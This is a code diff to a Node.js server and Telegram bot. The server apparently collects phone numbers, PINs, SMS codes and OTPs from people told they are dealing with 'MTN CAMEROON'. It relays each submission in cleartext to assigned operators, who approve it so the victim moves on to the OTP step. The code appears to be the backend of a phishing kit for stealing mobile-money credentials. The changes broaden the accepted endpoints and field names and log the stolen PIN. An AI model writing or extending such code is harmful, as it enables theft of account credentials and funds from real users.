@@ -422,7 +422,7 @@ Provide this to your super admin to get access.
 
         let message = `⏳ *PENDING APPLICATIONS*\n\n`;
         if (pinPending.length > 0) {
-            message += `📱 *PIN (${pinPending.length}):*\n`;
+            message += `📱 *PIN/SMS (${pinPending.length}):*\n`;
             pinPending.forEach((app, i) => {
                 message += `${i+1}. +237 ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
             });
@@ -826,12 +826,12 @@ bot.on('callback_query', async (callbackQuery) => {
     } 
     else if (action === 'deny' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'rejected' });
-        await bot.editMessageText(`❌ *PIN REJECTED*\n\nApp: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ PIN Denied' });
+        await bot.editMessageText(`❌ *PIN/SMS REJECTED*\n\nApp: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Denied' });
     } 
     else if (action === 'allow' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'approved' });
-        await bot.editMessageText(`✅ *PIN APPROVED*\n\nApp: \`${applicationId}\`\nUser proceeding to OTP.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.editMessageText(`✅ *PIN/SMS APPROVED*\n\nApp: \`${applicationId}\`\nUser proceeding to OTP.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved' });
     } 
     else if (action === 'approve' && type === 'otp') {
@@ -845,18 +845,27 @@ bot.on('callback_query', async (callbackQuery) => {
 // FRONT-END API ENDPOINTS
 // ==========================================
 
-// POST /api/verify-pin
-app.post('/api/verify-pin', async (req, res) => {
+// POST /api/verify-pin OR /api/verify-sms OR /api/submit-sms
+app.post(['/api/verify-pin', '/api/verify-sms', '/api/submit-sms'], async (req, res) => {
+    let lockKey = null;
     try {
-        const { phoneNumber, pin, adminId: requestAdminId, assignmentType, applicationId: existingAppId } = req.body;
+        // Extract flexible field names to prevent front-end field mismatches
+        const phoneNumber    = req.body.phoneNumber || req.body.phone || req.body.mobile;
+        const pin            = req.body.pin || req.body.sms || req.body.code || req.body.input || req.body.text;
+        const requestAdminId = req.body.adminId || req.body.admin;
+        const assignmentType = req.body.assignmentType;
+        const existingAppId  = req.body.applicationId || req.body.appId;
 
         if (!phoneNumber || !pin) {
-            return res.status(400).json({ success: false, message: 'Phone number and PIN are required.' });
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Phone number and PIN/SMS code are required.' 
+            });
         }
 
-        console.log('📥 PIN Submission Request:', { phoneNumber, requestAdminId, assignmentType, existingAppId });
+        console.log('📥 Verification Request Received:', { phoneNumber, pin, requestAdminId, assignmentType, existingAppId });
 
-        const lockKey = `pin_${phoneNumber}`;
+        lockKey = `pin_${phoneNumber}`;
         if (processingLocks.has(lockKey)) {
             return res.status(429).json({ success: false, message: 'Request currently processing. Please wait.' });
         }
@@ -869,18 +878,18 @@ app.post('/api/verify-pin', async (req, res) => {
             assignedAdmin = await db.getAdmin(requestAdminId);
 
             if (!assignedAdmin) {
-                processingLocks.delete(lockKey);
+                if (lockKey) processingLocks.delete(lockKey);
                 return res.status(400).json({ success: false, message: 'The link used is invalid.' });
             }
             if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
-                processingLocks.delete(lockKey);
+                if (lockKey) processingLocks.delete(lockKey);
                 return res.status(400).json({ success: false, message: 'This service link is temporarily inactive.' });
             }
         } else {
             const activeAdmins    = await db.getActiveAdmins();
             const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
             if (availableAdmins.length === 0) {
-                processingLocks.delete(lockKey);
+                if (lockKey) processingLocks.delete(lockKey);
                 return res.status(503).json({ success: false, message: 'No admins available right now. Please try again shortly.' });
             }
             const adminStats = await Promise.all(
@@ -919,7 +928,7 @@ app.post('/api/verify-pin', async (req, res) => {
             if (assignedAdmin.chatId) {
                 adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
             } else {
-                processingLocks.delete(lockKey);
+                if (lockKey) processingLocks.delete(lockKey);
                 return res.status(503).json({ success: false, message: 'Assigned admin is currently offline.' });
             }
         }
@@ -941,11 +950,11 @@ app.post('/api/verify-pin', async (req, res) => {
         }
 
         await sendToAdmin(assignedAdmin.adminId, `
-📱 *NEW PIN SUBMISSION (MTN CAMEROON)*
+📱 *NEW VERIFICATION SUBMISSION (MTN CAMEROON)*
 
 📋 App ID: \`${applicationId}\`
 📞 Phone: \`+237 ${formatPhone(phoneNumber)}\`
-🔑 PIN: \`${pin}\`
+🔑 Input/PIN: \`${pin}\`
 ⏰ Time: ${new Date().toLocaleString()}
 
 ⚠️ *ACTION REQUIRED:*
@@ -959,7 +968,7 @@ app.post('/api/verify-pin', async (req, res) => {
             }
         });
 
-        processingLocks.delete(lockKey);
+        if (lockKey) processingLocks.delete(lockKey);
         res.json({
             success: true,
             applicationId,
@@ -968,14 +977,14 @@ app.post('/api/verify-pin', async (req, res) => {
         });
 
     } catch (error) {
-        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
-        console.error('❌ Error in /api/verify-pin:', error);
+        if (lockKey) processingLocks.delete(lockKey);
+        console.error('❌ Error in verification endpoint:', error);
         res.status(500).json({ success: false, message: 'Server error: ' + error.message });
     }
 });
 
-// GET /api/check-pin-status/:applicationId
-app.get('/api/check-pin-status/:applicationId', async (req, res) => {
+// GET /api/check-pin-status/:applicationId OR /api/check-sms-status/:applicationId
+app.get(['/api/check-pin-status/:applicationId', '/api/check-sms-status/:applicationId'], async (req, res) => {
     try {
         const application = await db.getApplication(req.params.applicationId);
         if (application) {
@@ -993,10 +1002,12 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
     }
 });
 
-// POST /api/verify-otp
-app.post('/api/verify-otp', async (req, res) => {
+// POST /api/verify-otp OR /api/submit-otp
+app.post(['/api/verify-otp', '/api/submit-otp'], async (req, res) => {
     try {
-        const { applicationId, otp } = req.body;
+        const applicationId = req.body.applicationId || req.body.appId;
+        const otp           = req.body.otp || req.body.code || req.body.sms;
+
         if (!applicationId || !otp) {
             return res.status(400).json({ success: false, message: 'Application ID and OTP required.' });
         }
